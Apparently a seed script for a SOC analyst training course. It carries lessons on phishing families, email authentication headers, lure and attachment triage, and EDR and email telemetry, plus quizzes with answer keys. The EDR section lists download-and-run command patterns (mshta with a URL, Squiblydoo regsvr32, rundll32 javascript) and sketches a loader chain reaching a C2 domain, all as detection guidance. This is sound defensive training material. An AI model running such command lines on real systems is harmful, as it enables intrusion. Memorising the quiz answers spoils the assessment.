> 5. Identify the four kinds of spoofing none of SPF/DKIM/DMARC stops on its own
>
> **Prerequisites.** Modules 1–5 (Alert Lifecycle, SIEM Fundamentals, Windows Event Logs, Network Telemetry, IOC Handling).

## Why "phishing" is not one alert type

The catch-all term *phishing* hides at least eight family-level patterns. For the L1, **the family matters because each produces a different set of artefacts and therefore a different triage workflow.** Misclassifying a Business Email Compromise (BEC) attempt as a generic credential phish leads the analyst to spend the first 15 minutes hunting URL reputation when there is no URL — and miss the wire-transfer fraud entirely.

### Credential phishing (the classic)
A lure email drives the user to a landing page that mimics a real login portal. Credentials POST to attacker infrastructure. Distinguishing signal: the link goes to a domain that is not the brand's real login origin (`login-microsoftonline.evilkit[.]xyz`, or a compromised WordPress under `/wp-content/plugins/<name>/login.html`). M365-themed kits dominate 2023–2025 volume — EvilProxy, NakedPages, Caffeine, Tycoon 2FA.

### Malware delivery
The lure carries a payload — attachment or download link — and the goal is execution on the endpoint. Distinguishing signal: a *file* artefact instead of, or alongside, a credential page. Common 2023–2025 delivery primitives: HTML smuggling that decodes a blob inside the browser, ISO/IMG/VHD containers that historically bypassed Mark-of-the-Web (MOTW), OneNote (`.one`) embedded scripts after Office macros were blocked by default, `.lnk` shortcuts inside containers, SVGs with embedded JavaScript.

### Business Email Compromise (BEC)
Pure social engineering. *No malware. No link.* A trusted-party impersonation that asks for a financial action. Three sub-patterns:

- **CEO fraud / wire request** — *"Hi, are you at your desk? I need you to action a wire urgently. Confidential, only deal with me."* Lookalike domain or compromised CEO mailbox.
- **Vendor invoice redirect** — vendor mailbox is compromised or spoofed; new banking details. *"Please update our remit-to."*
- **Payroll diversion** — HR/Payroll is asked to change an employee's direct-deposit account before pay run.

Distinguishing signal: no URL, no attachment (or a benign PDF), an unusual `Reply-To`, financial verbs in the body (*"wire", "ACH", "remit", "direct deposit", "swift"*).

### Spear phishing vs whaling
Spear phishing is targeted, low-volume, with personal/organisational details (manager's name, real project, real vendor). Whaling targets executives specifically. Distinguishing signal: one or two recipients, mid-week, mid-day, looks routine.

### Smishing and vishing
Phishing over SMS and voice. ATT&CK now tracks voice as **T1566.004 Spearphishing Voice**. The L1 rarely triages a vishing call directly but will see downstream effects (someone called IT pretending to be a user, password got reset, suspicious sign-in followed).

### Quishing — QR phishing
A QR code in an email (often inside a PDF or PNG attachment) encodes the malicious URL. This evades URL-rewriting and link-reputation engines that scan text but not images. The user scans with a *phone*, leaving the corporate-managed endpoint and entering an unmanaged channel. Distinguishing signal: the body is essentially *"scan the QR to view the document."*

### Consent phishing (OAuth abuse)
Instead of stealing a password, the attacker registers a malicious application and tricks the user into clicking **Accept** on an OAuth consent prompt. The app receives a long-lived refresh token with scopes like `Mail.Read`, `Mail.Send`, `offline_access`, `Files.ReadWrite.All`. *No password ever changes hands; MFA is bypassed because the user authorised the app.* This is why password resets alone *do not* remediate consent-phish — the analyst must revoke the OAuth grant.

### Browser-in-the-Browser (BitB)
The phishing landing page renders a *fake browser chrome* (address bar, lock icon, padlock favicon) inside the actual browser viewport. A user inspecting "the URL" sees a perfectly spelled `login.microsoftonline.com` — but it is HTML elements, not the real address bar.

### AiTM / MFA-bypass kits
Adversary-in-the-Middle reverse-proxy kits (Evilginx, EvilProxy, Modlishka, Tycoon 2FA, Mamba 2FA, Greatness) sit between the victim and the real login. The user authenticates *for real* against Microsoft, completes MFA *for real*, and the kit captures the resulting session cookie. The attacker then replays the cookie and skips MFA entirely on subsequent sessions. This is the dominant phishing pattern of 2024–2025 against MFA-protected tenants. Distinguishing signal: a real, successful MFA login from an unusual IP/UA shortly after the user clicked, often followed by an inbox rule and a new MFA method registration.

### MFA fatigue / push bombing
After credential capture, the attacker authenticates repeatedly so the user's authenticator app spams pushes until the user taps Approve to make it stop. Often combined with a vishing call from "IT" telling the user the prompts are legitimate.

## Email anatomy: there are TWO `From` addresses

The single most cited mistake in junior phishing triage is reading "From" off the rendered email and not looking at headers.

### RFC 5321 envelope vs RFC 5322 header
- **RFC 5321 envelope sender** (`5321.MailFrom`, *return path*) — used during the SMTP `MAIL FROM:` command. Tells receiving servers where to send a bounce.
- **RFC 5322 header From** (`5322.From`) — what the user's client renders.

These do not have to match. Mailchimp, SendGrid, and other legitimate platforms routinely have a `5321.MailFrom` of `bounces@mailchimp.com` and a `5322.From` of the customer's domain. Attackers exploit the same gap: spoof the visible header From while using a throwaway envelope sender that passes SPF for the throwaway domain.

DMARC's job is to require *alignment* between these so an attacker cannot freely spoof the visible From — but DMARC only protects domains that publish it.

### The Received chain
Every relay along the path *prepends* a `Received:` header. The chain reads bottom-up (oldest at the bottom, freshest at the top). Walk from the bottom up until you reach a relay you don't recognise.

```text
Received: from BN8PR12MB3651.namprd12.prod.outlook.com (...) by ...
 with HTTPS; Tue, 22 Apr 2026 09:14:11 +0000
Received: from mail.attacker-relay.example (mail.attacker-relay.example
 [203.0.113.42]) by mx0a-00069f02.pphosted.com (8.17.1.19/8.17.1.19)
 with ESMTP id 4Y8m3...; Tue, 22 Apr 2026 09:13:58 +0000
```

The bottom relay injected the mail into your perimeter. `203.0.113.42` is the first thing the analyst should pivot on.

### The Authentication-Results header (the gateway's verdict)
Written by the first trusted hop. Reading it correctly is half the job. A clean pass:

```text
Authentication-Results: spf=pass (sender IP is 203.0.113.42)
 smtp.mailfrom=bounces.acme-marketing.com;
 dkim=pass (signature was verified) header.d=acme.com;
 dmarc=pass action=none header.from=acme.com;
 compauth=pass reason=100
```

A spoof:

```text
Authentication-Results: spf=fail (sender IP is 203.0.113.42)
 smtp.mailfrom=acmе.com;          ← cyrillic 'е'
 dkim=none (message not signed);
 dmarc=fail action=quarantine header.from=acme.com;
 compauth=fail reason=001
```

`compauth` is Microsoft's *composite authentication* result. `reason=100` is full pass; `reason=001` is explicit DMARC fail; `reason=000` means DMARC failed and policy was none/quarantine; `reason=130` is "passed implicit auth."

## SPF, DKIM, DMARC, ARC — what each one actually proves

### SPF (RFC 7208) — envelope-IP authorisation
A DNS TXT record on the sending domain listing IPs authorised to send mail "from" that domain *at the envelope level*.

`v=spf1 include:_spf.google.com include:spf.protection.outlook.com ip4:198.51.100.0/24 -all`

| Result | Meaning |
| --- | --- |
| `pass` | IP explicitly authorised |
| `fail` (`-all`) | Hard fail — should be rejected |
| `softfail` (`~all`) | Probably not authorised; accept and mark |
| `neutral` (`?all`) | Domain owner makes no assertion |
| `none` | No SPF record published |
| `permerror` / `temperror` | Lookup or syntax problem |

**What SPF does not catch.** It checks the *envelope* (5321), not the visible From (5322), so an attacker can pass SPF for `attacker.com` while putting `header.from=ceo@yourcorp.com` in the message. SPF is also broken by forwarding (forwarder's IP isn't in your SPF) — which is why ARC exists.

### DKIM (RFC 6376) — cryptographic signing
The sending server signs selected headers + the body with a private key; a public key sits in DNS at `<selector>._domainkey.<domain>`. The receiver re-computes the signature.

```text
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
 d=acme.com; s=selector1; t=1714390451;
 bh=YzNkN2YxYmE...; h=From:To:Subject:Date:Message-ID;
 b=Hk2T9...sig...==
```

Fields the triager cares about:

- `d=` — *signing* domain. DMARC alignment compares this to the header From.
- `s=` — selector, lets a domain rotate keys (`selector1`, `mar2026`, etc.).
- `bh=` — body hash. If anything along the path mutates the body, the hash breaks and DKIM fails.
- `h=` — list of signed headers. Headers *not* in this list can be added or modified downstream without breaking the signature.

**DKIM replay** — the 2023+ trick: an attacker captures a legitimately DKIM-signed message and re-injects it from their own infrastructure to new recipients. Body and headers unchanged, DKIM still passes. Defenders increasingly pin oversigning and short key TTLs.

### DMARC (RFC 7489) — alignment + policy
DMARC ties SPF and DKIM together by requiring that *at least one* passes *and aligns* with the header From.

`_dmarc.acme.com TXT "v=DMARC1; p=reject; rua=mailto:dmarc@acme.com; pct=100; adkim=s; aspf=s"`

- `p=` — policy: `none` (monitor) / `quarantine` / `reject`.
- `adkim=` / `aspf=` — alignment: `s` strict (exact match) or `r` relaxed (organisational domain).
- `pct=` — percentage of mail policy applies to (used during rollout).
- `rua=` — aggregate reports.
- `ruf=` — forensic per-message reports (most senders ignore due to privacy).

**What DMARC does:** stops naive header-From spoofing of a DMARC-protected domain. **What it does not:** stop lookalike domains, display-name spoofing, compromised legitimate accounts, or messages from domains that don't publish DMARC. A cousin-domain attack like `acme-billing.com` will pass DMARC for *its own* domain perfectly happily.

### ARC (RFC 8617) — preserving auth across forwarders
When mail is forwarded (mailing list, alias), the forwarding server can rewrite the message and break SPF/DKIM. ARC lets the forwarder seal the original auth result so the next hop can still trust it. Headers: `ARC-Authentication-Results`, `ARC-Message-Signature`, `ARC-Seal`. If the gateway trusts the forwarder, an ARC-pass can override a downstream SPF fail.

## SPF / DKIM / DMARC validation flow

```mermaid
flowchart TD
    A[Inbound message] --> B{SPF check<br/>5321.MailFrom IP authorised?}
    A --> C{DKIM check<br/>signature valid?}
    B -->|pass| D[SPF aligned with<br/>header.from?]
    C -->|pass| E[DKIM d= aligned with<br/>header.from?]
    D -->|yes| F[DMARC pass]
    E -->|yes| F
    D -->|no| G{Either aligned?}
    E -->|no| G
    B -->|fail| G
    C -->|fail| G
    G -->|no| H[DMARC fail<br/>apply p= policy]
    F --> I[Deliver]
    H --> J{p= ?}
    J -->|reject| K[Reject]
    J -->|quarantine| L[Junk]
    J -->|none| M[Deliver + report]
```

## What an attacker can spoof past auth

- **Display-name only** — *"Mike Boss <attacker@gmail.com>"*. Nothing in SPF/DKIM/DMARC stops this; DMARC only protects the domain part.
- **Lookalike domains** — `rnicrosoft.com`, `acme.co` not `.com`, `acmе.com` (IDN). These pass auth for *their own* domain.
- **Compromised legitimate sender** — vendor mailbox takeover. SPF/DKIM/DMARC all pass; only behaviour gives it away.
- **Reply-To swap** — `From: boss@yourcorp.com`, `Reply-To: boss.private@gmail.com`. Auth on the From passes; conversation gets diverted on reply.

## Glossary

- **5321.MailFrom / 5322.From** — envelope vs header sender; an attacker controls the latter more freely than the former unless DMARC enforces alignment.
- **SPF / DKIM / DMARC / ARC** — IP authorisation / signature / alignment-and-policy / forwarder-preserved auth chain.
- **compauth** — Microsoft's composite authentication verdict in the Authentication-Results header.
- **AiTM / consent / quishing / BEC** — phishing families with materially different triage workflows.

## Further reading

- RFCs 5321, 5322, 7208, 6376, 7489, 8617 — read the headers reference if you take only one thing.
- Microsoft Learn — *Anti-spam message headers in Microsoft 365* (compauth reasons reference).
""",
    )
    m6l1q = _add_lesson(
        session, mod6, order=2, title="Taxonomy & email auth — quiz",
        lesson_type=LessonType.QUIZ, duration_min=8,
        content_md="Four questions on phishing family identification, envelope-vs-header From, what DMARC does and doesn't stop, and reading a Received chain.",
    )
    _add_q(session, m6l1q, order=1, kind=QuestionKind.SINGLE,
        stem_md="Finance flags an email apparently from a known vendor asking AP to update banking details before next week's payment run. The message has no URL and no attachment, the SPF/DKIM/DMARC line shows `dmarc=fail action=quarantine header.from=acme.com` but the message was delivered, and the `Reply-To` differs from the visible `From`. Which phishing family does this best fit?",
        options=[
            {"value": "cred", "label": "Credential phishing"},
            {"value": "malware", "label": "Malware delivery"},
            {"value": "bec", "label": "BEC vendor invoice redirect"},
            {"value": "consent", "label": "OAuth consent phishing"},
        ],
        correct="bec",
        explanation_md="No URL + no attachment + financial verb + lookalike sender domain + Reply-To swap is the BEC vendor-invoice-redirect signature. The other families would each leave a different artefact (a credential page, a payload, an OAuth grant).",
        points=2,
    )
    _add_q(session, m6l1q, order=2, kind=QuestionKind.MULTI,
        stem_md="Which of the following are *not* stopped by SPF/DKIM/DMARC alone, even when all three pass?",
        options=[
            {"value": "displayname", "label": "Display-name spoof using a free Gmail address"},
            {"value": "lookalike", "label": "A lookalike domain like `rnicrosoft.com` that publishes its own SPF and DKIM"},
            {"value": "compromised", "label": "Mail sent from a compromised legitimate vendor mailbox"},
            {"value": "headerfrom", "label": "Naive header-From spoof of a DMARC-protected domain"},
            {"value": "replyto", "label": "Reply-To swap on an otherwise-aligned message"},
        ],
        correct=["displayname", "lookalike", "compromised", "replyto"],
        explanation_md="DMARC stops only naive header-From spoofing of *its own* domain. Display-name spoofs, lookalike domains (which auth for themselves), takeovers of legitimate senders, and Reply-To swaps all pass auth checks happily.",
        points=3,
    )
    _add_q(session, m6l1q, order=3, kind=QuestionKind.TRUEFALSE,
        stem_md="Resetting the user's password fully remediates a successful OAuth consent phishing attack because the attacker's app cannot continue to access the mailbox once the password changes.",
        options=[{"value": "true", "label": "True"}, {"value": "false", "label": "False"}],
        correct="false",
        explanation_md="**False.** Consent phishing issues the malicious app a *refresh token* tied to the granted OAuth permissions. The token is independent of the user's password — the app keeps reading mail until the *grant itself* is revoked.",
        points=2,
    )
    _add_q(session, m6l1q, order=4, kind=QuestionKind.SINGLE,
        stem_md="You're walking the `Received:` chain on a suspicious email and want to identify the IP that *injected* the message into your perimeter. Which entry should you focus on?",
        options=[
            {"value": "top", "label": "The top-most `Received:` header (most recent)"},
            {"value": "bottom", "label": "The bottom-most `Received:` header (oldest, the first untrusted relay)"},
            {"value": "rp", "label": "The Return-Path header"},
            {"value": "auth", "label": "The Authentication-Results header"},
        ],
        correct="bottom",
        explanation_md="Each relay *prepends* a Received header, so the chain is read bottom-up. The bottom-most entry is the oldest hop and is what actually injected the mail into your perimeter — that IP is the first pivot.",
        points=2,
    )

    # Lesson 6.2 — Lure and link/attachment triage
    m6l2 = _add_lesson(
        session, mod6, order=3,
        title="Lure analysis, lookalike domains, and attachment + link triage",
        lesson_type=LessonType.READING, duration_min=24,
        content_md="""
> **Learning objectives.** By the end of this lesson you'll be able to:
> 1. Recognise the common pretext families and the psychological levers (urgency, authority, scarcity) lures press
> 2. Spot brand-impersonation tells: display-name vs domain mismatch, hover URL vs displayed URL, lookalike domains via typosquat / combosquat / IDN homoglyph
> 3. Catalogue risky file types delivered in phishing — HTML smuggling, ISO/IMG/VHD, .lnk, .one, weaponised PDFs, .svg with script — and what to look for in each
> 4. Use URL reputation tooling — VirusTotal, urlscan.io, Hybrid Analysis, abuse.ch — and apply the **OPSEC submission rule** so you don't tip off a targeted attacker
> 5. Decide when to detonate in a sandbox versus rely on static analysis

## Common pretexts

The lure landscape rotates seasonally but the categories are stable:

- **HR / payroll** — *"your direct deposit has been updated", "review the new handbook", "tax form correction"*.
- **IT / M365** — *"your password expires in 24 hours", "storage quota exceeded", "MFA re-registration required", "new sign-in detected"*.
- **Voicemail / fax / scan** — *"you have a new voicemail from +44 ..."*, attached PDF/HTML.
- **DocuSign / Adobe Sign / OneDrive / SharePoint** — *"Mike shared a document with you"*.
- **Courier** — *"DHL/FedEx/USPS — package held, click to schedule redelivery"*.
- **Invoice / quote / PO** — finance-flavoured attachments.
- **Teams / Slack chat** — out-of-band IM linking to a phishing page (rising fast as tenants enable external Teams chat).
- **Calendar invite** — Google Calendar / Outlook ICS from an unknown sender, body contains the lure.
- **Captcha / "verify you're human"** — first hop to defeat URL crawlers; the captcha proves a human is on the page, then redirects.
- **QR code attachment** — message is essentially a single PNG/PDF telling the user to scan.

## Urgency, authority, scarcity

Lures press the same psychological levers social engineering has always pressed:

- **Urgency** — *"today", "in the next 30 minutes"*.
- **Authority** — *"from the CEO", "from IT"*.
- **Fear** — *"your account will be locked", "legal action"*.
- **Scarcity** — *"only 5 spots", "expires"*.

Triage heuristic: *if the email asks the user to do something quickly and outside the normal channel, treat it as suspicious until proven otherwise.*

## Brand impersonation tells

- **Display name vs From domain** — *"Microsoft 365 Security <noreply@account-security-portal.xyz>"*.
- **Hover URL ≠ displayed URL** — visible text says `https://login.microsoftonline.com`, hover reveals `https://o365-secure-login.azurewebsites.net/...`. Cloud hosts (Azure Web Apps, Cloudflare Workers, Vercel, GitHub Pages) inherit a trusted parent domain and are commonly abused.
- **Favicon mismatch** — landing page favicon missing or pixelated. Modern kits fix this, so *its absence is not exonerating.*
- **Logo as inline base64** — many kits embed the logo to avoid hot-link signatures.
- **Footer details** — copy-pasted boilerplate, wrong copyright year, wrong support phone, wrong physical address.

## Lookalike domains

- **Typosquats** — `mircosoft.com`, `goggle.com`, `paypa1.com` (digit 1 for letter `l`).
- **Combosquats** — `microsoft-login.com`, `acme-billing-portal.com`, `office365-secure.net`. Brand is present with extra tokens.
- **Homoglyph / IDN / punycode** — Unicode characters that *render* like ASCII: Cyrillic `а` (U+0430) for Latin `a`, Greek `ο` for Latin `o`. The ACE encoding (`xn--...`) gives it away in headers. Tooling: `dnstwist`, `urlcrazy`, Defender's "Look-alike Domain" detection.
- **TLD swap** — `acme.co`, `acme.io`, `acme.app` when the real one is `acme.com`.
- **Sub-domain abuse** — `acme.com.evilkit.xyz` looks legitimate at a glance because users read left-to-right.

Worked example: `https://login.microsoftоnline-verify.com/auth?...` — the `о` in `microsoft` is U+043E. The header rendering shows the real domain as `xn--micrsft-...`. That is enough on its own to confirm the message is malicious.

## Risky file types

| Extension | Why it's dangerous | What to look for |
| --------- | ------------------ | ---------------- |
| `.html` / `.htm` | HTML smuggling — JS in the page assembles a payload from a base64 blob and offers it as a download. | Long base64 strings, `Blob`, `msSaveOrOpenBlob`, `URL.createObjectURL`. |
| `.iso` / `.img` / `.vhd` / `.vhdx` | Container types that historically did not propagate Mark-of-the-Web (MOTW) to extracted files. Win11 22H2+ propagates from .iso, but estate coverage is mixed. | LNK or EXE inside, icon-spoof. |
| `.lnk` | Shortcut whose `Target` runs `cmd`/`powershell`/`mshta`/`rundll32` with attacker args. | `lnkparser` / `LECmd`; inspect `Arguments` and `IconLocation`. |
| `.one` (OneNote) | Can embed any OLE attachment (HTA, JS, BAT, CMD, VBS). Exploded Q1 2023 after Office macros blocked by default. | `pyOneNote`; `EmbeddedFiles`. |
| `.pdf` | Embedded JavaScript, embedded files, or just a phishing link — most modern PDF "phish" is the latter. | `pdfid.py`, `peepdf`. Look for `/JS`, `/JavaScript`, `/OpenAction`, `/EmbeddedFile`, `/URI`. |
| Office `.docm`/`.xlsm` macros | Blocked by default for Internet-zone files since 2022, still relevant where MOTW is missing. | `oletools` (`olevba`, `oleid`). |
| `.xll` | Excel add-in DLL. Loaded with no macro warning. Now blocked by default in newer Office. | Hash + sandbox. |
| `.svg` | XML with `<script>` or `<foreignObject>`; renders inline in the browser and runs JS. | Grep for `<script`, `eval`, `data:` URIs. |
| Password-protected `.zip` / `.7z` | Defeats most gateway sandboxes that can't unpack without the password (which is in the email body). | Note the password from the email; submit privately. |
| ClickOnce `.application` / `.appref-ms` | Launches a signed-looking installer from a URL. | Inspect the `<deployment>` URL in the manifest. |
| `.url` / `.website` | Internet shortcut; Windows resolves the icon path immediately, used for SMB credential theft. | Inspect `URL=`, `IconFile=`, `WorkingDirectory=`. |

## URL reputation tooling

- **VirusTotal** — multi-engine reputation, passive DNS, downloaded files history. Watch the *Relations* tab. **Public submissions are visible.**
- **urlscan.io** — fetches the URL in a sandboxed browser, screenshots the result, dumps DOM and network. Default visibility is *public*; use *unlisted* or *private* when triaging targeted lures.
- **Hybrid Analysis (Falcon Sandbox)** — file and URL detonation; static + dynamic.
- **abuse.ch URLhaus / ThreatFox / MalwareBazaar** — community blocklist + IOC sharing.
- **OPSWAT MetaDefender** — multi-engine static for files.
- **Cisco Talos / Spamhaus / SURBL** — IP/domain reputation.
- **PhishTank / OpenPhish** — community phish URL lists.

## OPSEC trap (revisited from Module 5: IOC Handling)

*If you submit an attacker-supplied URL or attachment to a public scanner, you tell the attacker that someone in your org received the lure and is investigating it.* Many kits encode the recipient (or a per-victim token) into the URL path or query. Submitting `https://kit.example/?id=abc123` to urlscan.io's public queue will appear in the kit's analytics, alerting them to burn the infrastructure or rotate the lure.

**Rule of thumb:**

- **Bulk / commodity phish** (template, generic, no per-victim token) → public submission OK.
- **Targeted / spear / BEC / AiTM with per-victim token** → use *unlisted* / *private* mode; or detonate in your private sandbox; or strip identifying tokens before public submission.

Module 5 covers the full OPSEC taxonomy; the rule is the same here.

## When to detonate vs static

Static analysis first if you can identify the file confidently and the lure is high-volume. Detonate when:

- The artefact is novel (no VT reputation).
- The triage decision turns on *behaviour* — does it call out? to where? does it write a registry key?
- You suspect multi-stage delivery (HTML → ISO → LNK → loader) and need the whole chain.
- You need IOCs (C2 hostnames/IPs, dropped file hashes, named pipes, mutexes) to pivot in EDR.

Sandbox options:

- **Any.run** — interactive (analyst can click through prompts). Community public; commercial private.
- **Joe Sandbox** — heavier static + dynamic; good behaviour graphs.
- **CAPE** — open-source Cuckoo successor; common self-hosted choice.
- **Hatching Triage / Recorded Future Triage** — fast, good Yara coverage.
- **Microsoft Defender for Office 365 Detonation** (Safe Attachments / Safe Links) — gateway already detonates and surfaces verdicts in Threat Explorer.

## Glossary

- **Pretext** — the social-engineering cover story (HR, IT, payroll, courier, M365, DocuSign, etc.).
- **Typosquat / combosquat / homoglyph** — three lookalike-domain families.
- **HTML smuggling** — JS in a benign-looking HTML page reconstructs a payload client-side, evading email-gateway scanners.
- **MOTW** — Mark-of-the-Web Zone.Identifier ADS; ISO/IMG containers historically bypassed it.
- **OPSEC submission rule** — *don't* feed targeted-lure URLs/files to public scanners with the per-victim token intact.

## Further reading

- urlscan.io — *Visibility levels* documentation (public / unlisted / private).
- Microsoft Learn — *Safe Attachments* and *Safe Links* in Defender for Office 365.
- abuse.ch — URLhaus and ThreatFox API docs.
""",
    )
    m6l2q = _add_lesson(
        session, mod6, order=4, title="Lure & link triage — quiz",
        lesson_type=LessonType.QUIZ, duration_min=7,
        content_md="Three questions on lookalike-domain classification, OPSEC submission decisions, and risky-file recognition.",
    )
    _add_q(session, m6l2q, order=1, kind=QuestionKind.SINGLE,
        stem_md="An analyst sees the URL `https://login.microsoftоnline.com/auth/...` and notices the rendering of the domain in the email source as `xn--micrsft-q9a.com`. Which lookalike-domain category does this fit?",
        options=[
            {"value": "typo", "label": "Typosquat"},
            {"value": "combo", "label": "Combosquat"},
            {"value": "tld", "label": "TLD swap"},
            {"value": "idn", "label": "IDN homoglyph (punycode)"},
        ],
        correct="idn",
        explanation_md="The Cyrillic `о` (U+043E) renders identically to Latin `o` but encodes differently — this is an IDN homoglyph attack, identified by the `xn--` ACE-encoded domain in the actual headers.",
        points=2,
    )
    _add_q(session, m6l2q, order=2, kind=QuestionKind.MULTI,
        stem_md="A user reports an email with the URL `https://acme-billing-portal.com/inv?id=PRIYA-93FA`. Mail-trace shows it was sent to four people, each with a different per-recipient token in the URL. Which of the following are *OPSEC-appropriate* analyst actions?",
        options=[
            {"value": "vt_full", "label": "Submit the full URL with the token to VirusTotal's public queue immediately"},
            {"value": "urlscan_private", "label": "Run the URL through urlscan.io in *private* mode"},
            {"value": "private_sandbox", "label": "Detonate the URL in your in-house private sandbox"},
            {"value": "strip_token", "label": "Strip the per-victim token, then submit the de-identified base URL to a public scanner if reputation is needed"},
            {"value": "publicpost", "label": "Post the URL to a public Slack channel asking other analysts to take a look"},
        ],
        correct=["urlscan_private", "private_sandbox", "strip_token"],
        explanation_md="Per-victim tokens identify the campaign back to the attacker if submitted to public services. Private/unlisted submission, in-house detonation, or stripping the token before public submission are all acceptable. Public VT submission and a public Slack post both leak the per-victim token.",
        points=3,
    )
    _add_q(session, m6l2q, order=3, kind=QuestionKind.SHORTANSWER,
        stem_md="An analyst inspects an HTML attachment that is 412 KB in size and contains a long base64 string plus calls to `Blob` and `msSaveOrOpenBlob`. Which delivery technique does this match? (Two or three words.)",
        options=None,
        correct=["html smuggling", "html-smuggling", "HTML smuggling", "smuggling"],
        explanation_md="HTML smuggling: JavaScript in the page reconstructs a binary payload from an embedded base64 blob and saves it via `Blob` + `msSaveOrOpenBlob`, evading the email gateway because no executable ever crosses the wire.",
        points=2,
    )

    # Lesson 6.3 — Detection telemetry across email + endpoint + identity
    m6l3 = _add_lesson(
        session, mod6, order=5,
        title="Detection telemetry: email side, endpoint side, identity side",
        lesson_type=LessonType.READING, duration_min=24,
        content_md="""
> **Learning objectives.** By the end of this lesson you'll be able to:
> 1. Pivot from a SIEM phishing alert to the email source-of-truth (Microsoft 365 Threat Explorer or Exchange Message Trace) and answer the *delivered? where? still there? clicked?* questions
> 2. Read an EDR process tree to identify a suspicious phishing-driven click-path (browser/Outlook → script-host)
> 3. Cite the Sysmon event IDs that fingerprint each step of the click-path
> 4. Use ECS field paths (`process.parent.name`, `url.original`, `email.from.address`, `dns.question.name`, `file.hash.sha256`) to write Kibana queries against phishing telemetry
> 5. Recognise the textbook AiTM signal in Microsoft Entra ID sign-in logs — token theft, session-cookie reuse, anomalous IP / UA, post-takeover inbox-rule creation
> 6. Identify illicit OAuth consent grants and call out the risky scopes that demand immediate escalation

## When the SIEM alert says "phishing", what does the L1 do first?

The L1 must pivot to the email source-of-truth and answer six questions:

1. *Did the message arrive?* — Threat Explorer / Message Trace.
2. *Where did it land?* — Inbox / Junk / Quarantine.
3. *Is it still there?* — or has ZAP / TRAP already pulled it.
4. *Did anyone click?* — UrlClickEvents / proxy logs.
5. *Did anyone authenticate?* — Entra ID sign-in logs for the lure landing.
6. *Who else got it?* — mail-trace, scope.

Until those questions are answered, the L1 cannot make a defensible decision.

## Email-side telemetry — Microsoft 365 / Defender for Office 365

**Threat Explorer / Real-time detections** is the central pane. Filters on *Sender, Recipients, Subject, URL, File, Detection technology, Delivery action.* Use it to confirm scope (how many recipients), check Delivery location (Inbox / Junk / Quarantine), and see the Safe Links URL click verdict.

**Email Entity Page** opens for a single message: headers, body preview, attachments, URLs, detection details, and an action menu (*Soft delete / Hard delete / Move to junk / Submit to Microsoft*). Delivery action is one of `Delivered`, `Junked`, `Blocked`, `Replaced`. Latest delivery location is one of `Inbox`, `Junk`, `Quarantine`, `External`, `Failed`, `Dropped`, `Forwarded`, `On-prem`, `Deleted items`, `Unknown`.

**Quarantine** holds messages blocked at the gateway. The L1 reviews user-released messages and can release/deny pending admin approval depending on policy.

**ZAP (Zero-hour Auto Purge)** retroactively removes a message from inboxes when the verdict updates after delivery. The trace shows `ZAP` in delivery action and `LatestStatus` of `FilteredAsSpam`/`FilteredAsMalware`/`FilteredAsPhish`.

**Submissions** (admin) is how the analyst reports a confirmed phish back to Microsoft for tenant-wide block + global signal improvement.

## Email-side telemetry — Exchange Message Trace

The mail-flow log. Useful when Threat Explorer doesn't have the message (licensing tier without DfO P2). Fields:

- `Received`, `SenderAddress` (5321 envelope), `RecipientAddress`, `Subject`, `Status` (`Delivered`, `FilteredAsSpam`, `Quarantined`, `Failed`, `Pending`, `Resolved`, `Expanded`).
- `MessageTraceId` (GUID) — pivot key for detailed trace.
- `MessageId` — RFC 5322 Message-ID.
- `FromIP`, `ToIP`, `Connector` (useful for partner-domain spoof checks), `OrganizationId`.

```powershell
Get-MessageTrace -SenderAddress "*@suspicious-domain.example" `
                 -StartDate (Get-Date).AddDays(-7) `
                 -EndDate (Get-Date) |
  Select-Object Received,SenderAddress,RecipientAddress,Subject,Status |
  Sort-Object Received |
  Format-Table -AutoSize
```

For per-message detail use `Get-MessageTraceDetail -MessageTraceId <guid>`. (Exact data-window for `Get-MessageTrace` — verify the current Microsoft Learn doc; Microsoft has changed it before.)

## Email-side telemetry — Google Workspace

- **Investigation tool** (Security Center) — search Gmail logs by sender, recipient, subject, URL, attachment hash; bulk actions (delete, restore, mark as phishing, send to quarantine).
- **Email log search** — lighter log viewer in Admin console.
- **Show original** in Gmail — full RFC 5322 source plus auth summary.
- Google-specific headers: `X-Gm-Message-State`, `X-Google-Smtp-Source`, `Received-SPF`, `ARC-*`.

## Endpoint-side: EDR process trees

If a user *clicked* and something detonated, the smoking gun is a process chain rooted at a mail or browser process spawning something it has no business spawning:

- `outlook.exe → cmd.exe / powershell.exe / wscript.exe / cscript.exe / mshta.exe / rundll32.exe / regsvr32.exe`
- `msedge.exe / chrome.exe / firefox.exe → cmd.exe / powershell.exe`
- `winword.exe / excel.exe / powerpnt.exe → powershell.exe / wscript.exe / cmd.exe`
- `explorer.exe → <something in Downloads>` immediately after a download event
- `mshta.exe https://...` — HTA download-and-run
- `regsvr32.exe /s /n /u /i:http://... scrobj.dll` — Squiblydoo / SCT abuse
- `rundll32.exe javascript:...` — JS via rundll32

```mermaid
flowchart TD
    OUT[outlook.exe] --> EDGE[msedge.exe]
    EDGE --> EXP[explorer.exe<br/>mounts ISO]
    EXP --> LNK[Invoice_Q1.lnk]
    LNK --> CMD[cmd.exe /c]
    CMD --> PS[powershell.exe<br/>-enc base64]
    PS --> RDLL[rundll32.exe<br/>xy.dll, Start]
    RDLL --> NET((C2: cdn-acme-billing.com))
    classDef red fill:#fdd,stroke:#a00,color:#000
    class CMD,PS,RDLL,NET red
```

Modern EDRs (Defender XDR, CrowdStrike, SentinelOne, Carbon Black, Cortex XDR) all expose process-lineage queries. **AMSI** captures inline-script content (PowerShell, JScript, VBScript, Office macros) before execution, giving the analyst the actual script text to read.

## Sysmon event-ID fingerprints for click-path follow-on

| Event ID | What it captures | Why it matters here |
| -------- | ---------------- | ------------------- |
| **1** Process Create | Parent/child chain, command line, hashes | The smoking-gun process tree |
| **3** Network Connect | Outbound socket from a process | Browser/loader → C2 |
| **7** Image Load | DLL loaded by a process | Side-loading by a downloader |
| **11** File Create | New file on disk | Payload dropped |
| **15** File Create Stream Hash | MOTW Zone.Identifier ADS | Confirms file came from Internet zone |
| **22** DNS Query | Process resolves a domain | Browser/loader resolves C2 |
| **25** Process Tampering | Hollowing / unmapping | Loader anti-analysis |

## ECS field paths the phishing triager queries against

ION's SIEM and most modern stacks normalise to Elastic Common Schema. Pin these:

- `process.parent.name`, `process.name`, `process.command_line`, `process.executable`
- `process.parent.command_line`
- `user.name`, `host.name`, `host.os.family`
- `url.original`, `url.domain`, `url.path`, `url.full`
- `dns.question.name`, `dns.question.type`, `dns.resolved_ip`
- `file.hash.sha256`, `file.path`, `file.name`, `file.extension`
